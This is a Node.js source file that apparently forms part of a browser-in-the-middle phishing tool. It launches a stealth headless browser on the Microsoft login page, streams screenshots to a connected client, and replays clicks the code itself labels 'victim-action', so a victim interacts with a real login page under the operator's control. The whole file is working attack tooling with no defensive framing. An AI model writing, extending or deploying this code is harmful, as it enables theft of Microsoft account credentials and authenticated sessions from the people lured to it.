const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    console.log(`[INIT] Launching for ${socket.id}`);
    let browser;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--single-process'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        // Helper to push frames
        const emitFrame = async () => {
            try {
                const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 35 });
                socket.emit('browser-render', { screenshot });
            } catch (e) {}
        };

        // Navigation with "Load" instead of "NetworkIdle" (Faster for Cloud)
        console.log(`[GOTO] Opening Target...`);
        page.goto('https://login.microsoftonline.com/', { waitUntil: 'load' });

        // HEARTBEAT: Force a frame every 1 second until the user interacts
        const heartbeat = setInterval(async () => {
            if (socket.connected) await emitFrame();
            else clearInterval(heartbeat);
        }, 1000);

        socket.on('victim-action', async (data) => {
            if (data.type === 'click') {
                await page.mouse.click(data.x, data.y);
                setTimeout(emitFrame, 200); // Quick refresh after click
            }
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
